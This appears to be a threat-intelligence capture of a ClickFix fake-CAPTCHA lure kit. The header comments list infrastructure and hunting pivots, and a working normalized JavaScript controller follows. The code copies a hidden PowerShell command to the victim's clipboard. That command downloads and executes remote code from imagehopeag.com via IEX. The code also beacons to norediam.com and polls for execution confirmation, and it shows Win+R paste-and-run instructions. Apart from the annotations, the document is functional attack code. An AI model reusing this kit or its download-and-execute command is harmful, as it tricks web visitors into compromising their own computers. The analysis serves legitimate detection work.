/*
 * ClickFix CFMD multi-lure kit
 *
 * Classification:
 *   clickfix
 *   fake-captcha
 *   powershell
 *   compromise
 *
 * Captured:
 *   2026-08-23
 *
 * The campaign uses a reusable ClickFix controller exposed as
 * window.__cfmdCaptcha.
 *
 * This build delivers a fake Cloudflare verification flow to Windows
 * visitors and uses Win + R for execution.
 *
 * Campaign token:
 *
 *   bbb5e2dc73837d5eb83c2e23285a8cac3532083e
 *
 * Clipboard command:
 *
 *   powershell -w 1 -c "iEX([System.Net.WebClient]::new().DownloadString(
 *       'https://imagehopeag.com/hex/traffic'
 *   ))"
 *
 *
 * Page loads
 *     |
 *     +-> detect OS
 *     |
 *     +-> Windows
 *           |
 *           +-> fake Cloudflare browser check
 *           |
 *           +-> fake Turnstile
 *           |     |
 *           |     +-> "Verify you are human"
 *           |
 *           +-> victim clicks verification
 *                 |
 *                 +-> copy PowerShell command
 *                 |
 *                 +-> norediam.com/traffic/api
 *                 |     |
 *                 |     +-> event=copy
 *                 |
 *                 +-> instructions
 *                 |     |
 *                 |     +-> Win + R
 *                 |     +-> Ctrl + V
 *                 |     +-> Enter
 *                 |
 *                 +-> PowerShell
 *                 |     |
 *                 |     +-> imagehopeag.com
 *                 |           |
 *                 |           +-> /hex/traffic
 *                 |                 |
 *                 |                 +-> DownloadString()
 *                 |                 +-> IEX
 *                 |
 *                 +-> poll norediam.com
 *                       |
 *                       +-> event=check_execute
 *                       |
 *                       +-> {"executed":1}
 *                             |
 *                             +-> mark completed
 *                             +-> fake success animation
 *                             +-> dismiss lure
 *
 *
 * Infrastructure:
 *
 *   norediam.com
 *       ClickFix telemetry and execution-status backend
 *
 *   /traffic/api
 *       Campaign event and execution-status endpoint
 *
 *   imagehopeag.com
 *       PowerShell delivery host
 *
 *   /hex/traffic
 *       PowerShell stage
 *
 *
 * Campaign state:
 *
 *   captcha_copied_<token>
 *   captcha_executed_<token>
 *
 *
 * Available lure handling in the common controller:
 *
 *   reCAPTCHA
 *   Cloudflare
 *   Microsoft
 *   DDoS-Guard
 *   Chrome passkey
 *
 *
 * Available execution flows:
 *
 *   Windows / Win + R
 *       Win + R
 *       Ctrl + V
 *       Enter
 *
 *   Windows / Terminal
 *       Win + X
 *       Terminal / PowerShell
 *       Ctrl + V
 *       Enter
 *
 *   macOS
 *       Cmd + Space
 *       Terminal
 *       Cmd + V
 *       Enter
 *
 *   Linux
 *       Ctrl + Alt + T
 *       Ctrl + Shift + V
 *       Enter
 *
 *
 * Useful pivots:
 *
 *   __cfmdCaptcha
 *   /traffic/api
 *   event=copy
 *   event=check_execute
 *   captcha_copied_
 *   captcha_executed_
 *   "executed":1
 *   imagehopeag.com/hex/traffic
 *   norediam.com
 *   bbb5e2dc73837d5eb83c2e23285a8cac3532083e
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const TOKEN =
        "bbb5e2dc73837d5eb83c2e23285a8cac3532083e";

    const TRACK_URL =
        "https://norediam.com/traffic/api" +
        "?t=" +
        TOKEN +
        "&track=1";

    const WINDOWS_COMMAND =
        'powershell -w 1 -c "' +
        "iEX([System.Net.WebClient]::new()" +
        ".DownloadString(" +
        "'https://imagehopeag.com/hex/traffic'" +
        '))"';

    const COMMANDS = {
        windows:
            WINDOWS_COMMAND,

        macos:
            "",

        linux:
            "",

        winr:
            true,

        wine:
            false
    };

    const COPY_KEY =
        "captcha_copied_" +
        TOKEN;

    const EXECUTED_KEY =
        "captcha_executed_" +
        TOKEN;

    const POLL_START_MS =
        4000;

    const POLL_MAX_MS =
        12000;

    const POLL_MAX =
        90;

    /*
     * Detect the platform selected by this build.
     */
    function detectOS() {
        const ua =
            String(
                navigator.userAgent ||
                ""
            ).toLowerCase();

        const platform =
            String(
                navigator.platform ||
                ""
            ).toLowerCase();

        if (
            /windows nt|\bwin32\b|\bwin64\b|\bwow64\b/
                .test(ua) ||
            /^win/.test(platform)
        ) {
            return "windows";
        }

        if (
            /iphone|ipad|ipod|android/
                .test(ua)
        ) {
            return "mobile";
        }

        if (
            /macintosh|mac os x/
                .test(ua) ||
            platform.startsWith("mac")
        ) {
            return "macos";
        }

        if (
            /\blinux\b|x11|ubuntu|debian|fedora/
                .test(ua)
        ) {
            return "linux";
        }

        return "unknown";
    }

    /*
     * Select the configured command for the current OS.
     */
    function pickCommand() {
        switch (
            detectOS()
        ) {
            case "windows":
                return COMMANDS.windows;

            case "macos":
                return COMMANDS.macos;

            case "linux":
                return COMMANDS.linux;

            default:
                return "";
        }
    }

    /*
     * Build the operator telemetry URL.
     *
     * Observed events include:
     *
     *   os
     *   copy
     *   check_execute
     */
    function buildTrackUrl(
        event
    ) {
        const parameters =
            new URLSearchParams({
                event,
                t:
                    TOKEN,
                domain:
                    location.hostname,
                os:
                    detectOS()
            });

        return (
            TRACK_URL +
            "&" +
            parameters.toString()
        );
    }

    function trackEvent(
        event
    ) {
        const url =
            buildTrackUrl(
                event
            );

        if (
            navigator.sendBeacon
        ) {
            navigator.sendBeacon(
                url
            );

            return;
        }

        fetch(
            url,
            {
                method:
                    "GET",

                keepalive:
                    true,

                mode:
                    "no-cors"
            }
        ).catch(
            () => {}
        );
    }

    /*
     * Copy the configured command.
     */
    async function copyCommand() {
        const command =
            pickCommand();

        if (!command) {
            return;
        }

        if (
            navigator.clipboard &&
            window.isSecureContext
        ) {
            try {
                await navigator
                    .clipboard
                    .writeText(
                        command
                    );
            } catch {
                fallbackCopy(
                    command
                );
            }
        } else {
            fallbackCopy(
                command
            );
        }

        localStorage.setItem(
            COPY_KEY,
            "true"
        );

        trackEvent(
            "copy"
        );
    }

    function fallbackCopy(
        value
    ) {
        const textarea =
            document.createElement(
                "textarea"
            );

        textarea.value =
            value;

        textarea.style.cssText =
            "position:fixed;" +
            "opacity:0";

        document.body
            .appendChild(
                textarea
            );

        textarea.select();

        try {
            document.execCommand(
                "copy"
            );
        } catch {
        }

        textarea.remove();
    }

    /*
     * Ask the campaign backend whether the clipboard command has executed.
     *
     * Expected success response:
     *
     *   {
     *       "executed": 1
     *   }
     */
    async function checkExecuted() {
        try {
            const response =
                await fetch(
                    buildTrackUrl(
                        "check_execute"
                    ),
                    {
                        method:
                            "GET",

                        credentials:
                            "omit",

                        cache:
                            "no-store"
                    }
                );

            const result =
                await response.json();

            return Boolean(
                result &&
                result.executed === 1
            );
        } catch {
            return false;
        }
    }

    /*
     * Poll execution state after clipboard delivery.
     *
     * Delay starts at four seconds and increases by two seconds every
     * ten attempts, capped at twelve seconds.
     */
    function startExecutePoll(
        onSuccess
    ) {
        let count = 0;

        function schedule() {
            if (
                count > POLL_MAX
            ) {
                return;
            }

            const delay =
                Math.min(
                    POLL_MAX_MS,
                    POLL_START_MS +
                    Math.floor(
                        count / 10
                    ) *
                    2000
                );

            setTimeout(
                async () => {
                    count++;

                    if (
                        await checkExecuted()
                    ) {
                        localStorage
                            .setItem(
                                EXECUTED_KEY,
                                "true"
                            );

                        if (
                            onSuccess
                        ) {
                            onSuccess();
                        }

                        return;
                    }

                    schedule();
                },
                delay
            );
        }

        schedule();
    }

    /*
     * Active Windows instructions in this campaign.
     */
    function getInstructions() {
        if (
            COMMANDS.winr
        ) {
            return [
                "Win + R",
                "Ctrl + V",
                "Enter"
            ];
        }

        return [
            "Win + X",
            "Terminal / PowerShell",
            "Ctrl + V",
            "Enter"
        ];
    }

    /*
     * Recovered high-level ClickFix interaction.
     */
    async function verificationClicked() {
        await copyCommand();

        startExecutePoll(
            function () {
                /*
                 * Original:
                 *
                 *   hide instructions
                 *   draw success check
                 *   fade lure
                 *   remove overlay
                 */
            }
        );

        return {
            os:
                detectOS(),

            instructions:
                getInstructions()
        };
    }

    window.__cfmdCaptcha = {
        commands:
            COMMANDS,

        detectOS,
        pickCommand,
        trackEvent,
        copyCommand,
        checkExecuted,
        startExecutePoll
    };

    void verificationClicked;
})();


/*
 * Original campaign configuration
 *
 * TOKEN:
 *
 *   bbb5e2dc73837d5eb83c2e23285a8cac3532083e
 *
 *
 * TRACK_URL:
 *
 *   https://norediam.com/traffic/api
 *       ?t=bbb5e2dc73837d5eb83c2e23285a8cac3532083e
 *       &track=1
 *
 *
 * COMMANDS:
 *
 *   windows:
 *
 *       powershell -w 1 -c
 *       "iEX([System.Net.WebClient]::new().DownloadString(
 *           'https://imagehopeag.com/hex/traffic'
 *       ))"
 *
 *   macos:
 *       ""
 *
 *   linux:
 *       ""
 *
 *   winr:
 *       true
 *
 *   wine:
 *       false
 *
 *
 * Execution confirmation:
 *
 *   GET /traffic/api
 *       ?event=check_execute
 *       &t=<token>
 *       &domain=<victim host>
 *       &os=windows
 *
 * Success:
 *
 *   {
 *       "executed": 1
 *   }
 */
